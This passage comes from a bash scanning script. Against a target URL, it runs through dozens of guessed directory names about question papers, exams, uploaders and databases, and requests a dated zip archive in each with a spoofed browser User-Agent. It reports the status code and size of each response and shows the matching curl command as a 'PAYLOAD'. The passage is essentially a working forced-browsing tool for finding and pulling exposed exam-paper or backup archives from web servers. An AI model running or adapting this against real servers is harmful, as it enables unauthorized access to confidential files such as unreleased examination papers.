${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
